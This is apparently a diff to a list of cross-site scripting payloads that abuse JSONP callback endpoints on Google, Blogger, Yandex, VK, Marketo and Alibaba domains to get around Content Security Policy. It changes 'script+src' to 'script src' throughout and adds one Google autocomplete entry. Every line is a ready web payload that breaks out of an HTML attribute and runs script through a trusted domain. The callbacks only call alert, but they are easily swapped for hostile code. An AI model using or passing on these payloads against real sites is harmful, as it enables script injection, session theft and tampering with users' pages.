@@ -1,18 +1,19 @@
 #Google.com:
-"><script+src="https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)"></script>
-"><script+src="https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)"></script>
-"><script+src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>
-"><script+src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
+"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
+"><script src="https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)"></script>
+"><script src="https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)"></script>
+"><script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>
+"><script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
 #Blogger.com:
-"><script+src="https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)"></script>
+"><script src="https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)"></script>
 #Yandex:
-"><script+src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert(1337)"></script>
-"><script+src="https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert"></script>
+"><script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert(1337)"></script>
+"><script src="https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert"></script>
 #VK.com:
-"><script+src="https://api.vk.com/method/wall.get?callback=alert(1337)"></script>
+"><script src="https://api.vk.com/method/wall.get?callback=alert(1337)"></script>
 #Marketo.com
-"><script+src="http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
-"><script+src="http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
+"><script src="http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
+"><script src="http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
 #AlibabaGroup:
 "><script+src="https://detector.alicdn.com/2.7.3/index.php?callback=alert(1337)"></script>
 "><script+src="https://suggest.taobao.com/sug?callback=alert(1337)"></script>
